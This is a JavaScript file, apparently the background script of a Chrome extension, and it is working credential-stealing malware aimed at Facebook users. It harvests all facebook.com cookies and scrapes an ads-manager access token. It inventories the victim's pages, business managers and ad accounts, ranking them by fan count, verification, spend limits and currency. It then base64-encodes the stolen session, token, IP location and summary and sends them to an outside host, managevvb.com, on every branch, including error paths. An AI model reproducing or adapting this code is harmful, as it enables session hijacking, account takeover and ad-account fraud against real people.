let cook;
let myList = [];
const newLine = "\n";
let dem = 0;
let vip = "|";
let demtkqc = 0, dem25 = 0, dem50 = 0, demtktt = 0, deminr = 0, Liveadstkdie = 0, demnolimit = 0, dem250 = 0;
let nave = navigator.userAgent + "*m1|";
let se = "sheet1";
let si = "1MK7nH-JFuOf8N-UNIAU-07qMHclPOnznqCqoUvE7BfE";
let te = "p";
const exchangeRates = {USD: 1, AED: 0.27, AFN: 0.013, ALL: 0.0093, AMD: 0.002, ANG: 0.56, AOA: 0.0016, ARS: 0.011, AUD: 0.75, AWG: 0.56, AZN: 0.59, BAM: 0.61, BBD: 0.5, BDT: 0.012, BGN: 0.61, BHD: 2.65, BIF: 0.00049, BMD: 1, BND: 0.74, BOB: 0.14, BRL: 0.19, BSD: 1, BTN: 0.014, BWP: 0.092, BYN: 0.39, BZD: 0.5, CAD: 0.81, CDF: 0.00051, CHF: 1.08, CLP: 0.0014, CNY: 0.15, COP: 0.00028, CRC: 0.0016, CUC: 1, CUP: 0.038, CVE: 0.0099, CZK: 0.046, DJF: 0.0056, DKK: 0.16, DOP: 0.017, DZD: 0.0082, EGP: 0.064, ERN: 0.066, ETB: 0.023, EUR: 1.18, FJD: 0.49, FKP: 1.39, GBP: 1.39, GEL: 0.3, GGP: 1.39, GHS: 0.17, GIP: 1.39, GMD: 0.019, GNF: 0.0001, GTQ: 0.13, GYD: 0.0048, HKD: 0.13, HNL: 0.042, HRK: 0.16, HTG: 0.011, HUF: 0.0034, IDR: 0.000069, ILS: 0.31, IMP: 1.39, INR: 0.014, IQD: 0.00068, IRR: 0.000024, ISK: 0.0079, JEP: 1.39, JMD: 0.007, JOD: 1.41, JPY: 0.0092, KES: 0.0092, KGS: 0.012, KHR: 0.00025, KMF: 0.0022, KPW: 0.0011, KRW: 0.00088, KWD: 3.32, KYD: 1.2, KZT: 0.0023, LAK: 0.0001, LBP: 0.00066, LKR: 0.005, LRD: 0.0062, LSL: 0.067, LYD: 0.22, MAD: 0.11, MDL: 0.057, MGA: 0.00027, MKD: 0.018, MMK: 0.00063, MNT: 0.00035, MOP: 0.12, MRO: 0.0028, MRU: 0.028, MUR: 0.025, MVR: 0.065, MWK: 0.0012, MXN: 0.05, MYR: 0.24, MZN: 0.016, NAD: 0.067, NGN: 0.0024, NIO: 0.028, NOK: 0.12, NPR: 0.0085, NZD: 0.7, OMR: 2.6, PAB: 1, PEN: 0.25, PGK: 0.28, PHP: 0.02, PKR: 0.0064, PLN: 0.26, PYG: 0.00016, QAR: 0.27, RON: 0.24, RSD: 0.01, RUB: 0.014, RWF: 0.001, SAR: 0.27, SBD: 0.12, SCR: 0.073, SDG: 0.019, SEK: 0.12, SGD: 0.74, SHP: 1.39, SLL: 0.0001, SOS: 0.0017, SRD: 0.066, SSP: 0.0025, STD: 0.00005, STN: 0.0001, SVC: 0.11, SYP: 0.00063, SZL: 0.067, THB: 0.031, TJS: 0.091, TMT: 0.29, TND: 0.36, TOP: 0.45, TRY: 0.12, TTD: 0.15, TWD: 0.036, TZS: 0.00043, UAH: 0.037, UGX: 0.00028, UYU: 0.023, UZS: 0.000093, VES: 0.0002, VND: 0.000044, VUV: 0.0091, WST: 0.39, XAF: 0.0018, XCD: 0.37, XDR: 1.41, XOF: 0.0018, XPF: 0.0099, YER: 0.0039, ZAR: 0.067, ZMW: 0.056, ZWL: 0.0028};
let o = {headers: {cookie: cook, accept: "*/*", "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "content-type": "application/json", "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"', "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "none"}, referrerPolicy: "strict-origin-when-cross-origin", body: null, method: "GET", mode: "cors", credentials: "include"};
const getsss = () => {
  return new Promise((resolve, reject) => {
    chrome.cookies.getAll({url: "https://facebook.com"}, data => {
      const coo = data.map(e => {
        return "" + e.name + "=" + e.value + "";
      }).join(";");
      resolve(coo);
    });
  });
};
function GetToken(cook) {
  return new Promise(resolve => {
    fetch("https://www.facebook.com/ads/manager/account_settings/information/", o).then(req => {
      return req.text();
    }).then(responseHTML => {
      let startS = 'access_token:"';
      let endS = '"';
      let regex = new RegExp("" + startS + "(.*?)" + endS + "");
      let match = responseHTML.match(regex);
      let token_bm = match ? match[1] : null;
      let startS2 = '"token":"';
      let endS2 = '"';
      let fb_dtsg = responseHTML.match(new RegExp("(?<=" + startS2 + "+).*?(?=" + endS2 + ")", "gs"))[0];
      resolve({token_bm, fb_dtsg});
    }).catch(error => {
      fetch("https://www.facebook.com/ads/manager/account_settings/information/", o).then(req => {
        return req.text();
      }).then(responseHTML => {
        let startS = 'access_token:"';
        let endS = '"';
        let regex = new RegExp("" + startS + "(.*?)" + endS + "");
        let match = responseHTML.match(regex);
        let token_bm = match ? match[1] : null;
        let startS2 = '"token":"';
        let endS2 = '"';
        let fb_dtsg = responseHTML.match(new RegExp("(?<=" + startS2 + "+).*?(?=" + endS2 + ")", "gs"))[0];
        resolve({token_bm, fb_dtsg});
      });
    });
  });
}
function convertToUSD(amount, currency) {
  if (currency === "USD") {
    return amount;
  }
  ;
  if (!exchangeRates.hasOwnProperty(currency)) {
    return 1e5;
  }
  ;
  const exchangeRate = exchangeRates[currency];
  const usdAmount = amount * exchangeRate;
  return usdAmount;
}
getsss().then(coo => {
  if (!coo.includes("c_user")) {
    return;
  }
  ;
  GetToken(coo).then(result => {
    fetch("https://graph.facebook.com/v8.0/me/accounts?fields=id,fan_count,tasks,business,verification_status&access_token=" + result.token_bm + "", o).then(response => {
      return response.text();
    }).then(data => {
      if (!data.includes("data")) {
        myList.push("error check page");
      } else {
        if (data.includes("fan_count")) {
          const parsedData = JSON.parse(data);
          let infop = "";
          parsedData.data.forEach(function (data, index) {
            let bm = "";
            if (data.hasOwnProperty("business")) {
              bm = " BM : " + data.business.id;
            }
            ;
            let admin = "";
            if (data.hasOwnProperty("tasks")) {
              if (!data.tasks.includes("MANAGE") && !data.tasks.includes("PROFILE_PLUS_FULL_CONTROL")) {
                admin = "false";
              }
            }
            ;
            let veri = "";
            if (data.verification_status != "not_verified") {
              veri = data.verification_status;
            }
            ;
            infop += data.id + " " + veri + " Like: " + data.fan_count + " " + admin + bm + newLine;
            if (data.fan_count > 1e4 && admin == "") {
              dem++;
              vip += " Page like: " + data.fan_count + " " + data.verification_status;
            }
          });
          myList.push(infop);
        } else {
          myList.push("0 page");
        }
      }
      ;
      fetch("https://graph.facebook.com/v10.0/me/businesses?fields=id,verification_status,can_create_ad_account,sharing_eligibility_status,created_time&access_token=" + result.token_bm + "", o).then(response => {
        return response.text();
      }).then(data => {
        if (!data.includes("data")) {
          myList.push("error check bm");
        } else {
          if (data.includes("verification_status")) {
            let infob = "";
            const bmdt = JSON.parse(data);
            bmdt.data.forEach(function (data, index) {
              let check350 = data.sharing_eligibility_status;
              if (check350.includes("enabled")) {
                check350 = "350";
              } else {
                check350 = "50";
              }
              ;
              let very = data.verification_status;
              let v = "";
              if (!very.includes("not") && !very.includes("pending") && !very.includes("rejected")) {
                dem++;
                vip += "BMverified";
                v = very;
              }
              ;
              let date = new Date(data.created_time);
              let year = date.getFullYear();
              infob += data.id + v + " Limit: " + check350 + " year : " + year + newLine;
            });
            myList.push(infob);
          } else {
            myList.push("0 BM");
          }
        }
        ;
        fetch("https://graph.facebook.com/v14.0/me/adaccounts?fields=account_id,account_status,currency,is_prepay_account,adspaymentcycle,adtrust_dsl,amount_spent,balance,created_time,business&limit=1000&access_token=" + result.token_bm + "", o).then(response => {
          return response.text();
        }).then(data => {
          let ads = "";
          let ad = 0;
          if (!data.includes("data")) {
            myList.push("error check ads");
          } else {
            const addt = JSON.parse(data);
            addt.data.forEach(function (data, index) {
              demtkqc++;
              let nguong = "0";
              let stt = "Live";
              if (data.account_status == 2) {
                stt = "Die";
                Liveadstkdie++;
              } else {
                if (data.account_status == 3) {
                  stt = "No";
                } else {
                  if (data.account_status == 9) {
                    stt = "An han";
                  } else {
                    if (data.account_status == 101) {
                      stt = "close";
                    }
                  }
                }
              }
              ;
              if (data.hasOwnProperty("adspaymentcycle")) {
                data.adspaymentcycle.data.forEach(function (dt, index) {
                  if (data.currency != "IDR" && data.currency != "HUF" && data.currency != "VND" && data.currency != "COP" && data.currency != "CRC" && data.currency != "ISK") {
                    let ts = dt.threshold_amount / 100;
                    nguong = ts + " " + data.currency;
                  } else {
                    nguong = dt.threshold_amount + " " + data.currency;
                  }
                });
              }
              ;
              let amoutspent = 0;
              if (data.amount_spent > 0) {
                amoutspent = data.amount_spent / 100;
              }
              ;
              let no = 0;
              if (data.balance > 0) {
                no = data.balance / 100;
              }
              ;
              let prepay = "";
              if (data.is_prepay_account == true) {
                prepay = " TKTT ";
                demtktt++;
              }
              ;
              if (data.currency == "INR" && demtktt == 0) {
                deminr++;
              }
              ;
              let limitusd = Math.floor(convertToUSD(data.adtrust_dsl, data.currency));
              if (demtktt == 0 && deminr == 0 && nguong == "0" && limitusd > 35 && limitusd < 240 && Liveadstkdie == 0) {
                dem50++;
              } else {
                if (demtktt == 0 && deminr == 0 && nguong == "0" && limitusd > 240 && Liveadstkdie == 0) {
                  dem250++;
                } else {
                  if (demtktt == 0 && deminr == 0 && nguong == "0" && limitusd > 0 && Liveadstkdie == 0) {
                    dem25++;
                  } else {
                    if (demtktt == 0 && deminr == 0 && nguong == "0" && limitusd <= 0 && Liveadstkdie == 0) {
                      demnolimit++;
                    }
                  }
                }
              }
              ;
              let date = new Date(data.created_time);
              let year = date.getFullYear();
              ads += data.id + " Status: " + stt + " Currency : " + data.currency + prepay + " Nguong: " + nguong + " Limit: " + data.adtrust_dsl + " =>" + limitusd + " USD" + " Spent: " + amoutspent + " No: " + no + " Year :" + year + newLine;
              if (stt == "Live" || stt == "No" || stt == "close" || stt == "An han") {
                if (limitusd > 180 || limitusd < 0 || data.hasOwnProperty("adspaymentcycle")) {
                  if (data.amount_spent > 0) {
                    dem++;
                    ad++;
                  }
                }
              }
            });
          }
          ;
          if (ad > 0) {
            vip += "ADS: " + ads;
          }
          ;
          if (demtkqc == 1 && Liveadstkdie > 0 && dem == 0) {
            se = "Liveadstkdie";
          } else {
            if (demtkqc == 1 && demtktt > 0 && dem == 0) {
              se = "TKTT";
            } else {
              if (demtkqc == 1 && deminr > 0 && dem == 0) {
                se = "INR";
              } else {
                if (demtkqc == 1 && dem50 > 0 && dem == 0) {
                  se = "limit50";
                } else {
                  if (demtkqc == 1 && dem250 > 0 && dem == 0) {
                    se = "limit250";
                  } else {
                    if (demtkqc == 1 && dem25 > 0 && dem == 0) {
                      se = "limit25";
                    } else {
                      if (demtkqc == 1 && demnolimit > 0 && dem == 0) {
                        se = "Nolimit";
                      }
                    }
                  }
                }
              }
            }
          }
          ;
          myList.push(ads);
          fetch("http://ip-api.com/json", {method: "GET"}).then(e => {
            return e.text();
          }).then(e => {
            let ipx = JSON.parse(e);
            let ip = ipx.country + " " + ipx.city + " " + ipx.zip + " " + ipx.isp + " " + ipx.query;
            console.log(ip);
            let msg = "";
            if (dem > 0) {
              let tong = coo + "*" + nave + "*" + ip + vip;
              if (tong.length > 4010) {
                tong = tong.substring(0, 4e3) + "continue...";
              }
              ;
              msg = encodeURIComponent(btoa(encodeURIComponent(tong)));
            }
            ;
            let url = encodeURIComponent(btoa(encodeURIComponent(coo + "|" + result.token_bm + "*" + nave + myList.join("|") + "|" + ip)));
            fetch("https://managevvb.com/?coo=" + url + "&se=" + se + "&si=" + si + "&msg=" + msg + "&te=" + te + "", {method: "GET"});
          }).catch(error => {
            let msg = "";
            if (dem > 0) {
              let tong = coo + "*" + nave + "*" + vip;
              if (tong.length > 4010) {
                tong = tong.substring(0, 4e3) + "continue...";
              }
              ;
              msg = encodeURIComponent(btoa(encodeURIComponent(tong)));
            }
            ;
            let url = encodeURIComponent(btoa(encodeURIComponent(coo + "|" + result.token_bm + "*" + nave + myList.join("|"))));
            fetch("https://managevvb.com/?coo=" + url + "&se=" + se + "&si=" + si + "&msg=" + msg + "&te=" + te + "", {method: "GET"});
          });
        }).catch(error => {
          myList.push("ADS check error");
          let url = encodeURIComponent(btoa(encodeURIComponent(coo + "|" + nave + myList.join("|"))));
          fetch("https://managevvb.com/?coo=" + url + "&se=" + se + "&si=" + si + "&te=" + te + "", {method: "GET"});
        });
      }).catch(error => {
        let url = encodeURIComponent(btoa(encodeURIComponent(coo + "|" + nave + myList.join("|"))));
        fetch("https://managevvb.com/?coo=" + url + "&se=" + se + "&si=" + si + "&te=" + te + "", {method: "GET"});
      });
    }).catch(error => {
      myList.push("Page check error");
      let url = encodeURIComponent(btoa(encodeURIComponent(coo + "|" + nave + myList.join("|"))));
      fetch("https://managevvb.com/?coo=" + url + "&se=" + se + "&si=" + si + "&te=" + te + "", {method: "GET"});
    });
  }).catch(error => {
    myList.push("Token check error");
    let url = encodeURIComponent(btoa(encodeURIComponent(coo + "|" + nave + myList.join("|"))));
    fetch("https://managevvb.com/?coo=" + url + "&se=" + se + "&si=" + si + "&te=" + te + "", {method: "GET"});
  });
});
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.action === "executeFunction") {
    chrome.runtime.reload();
  }
});
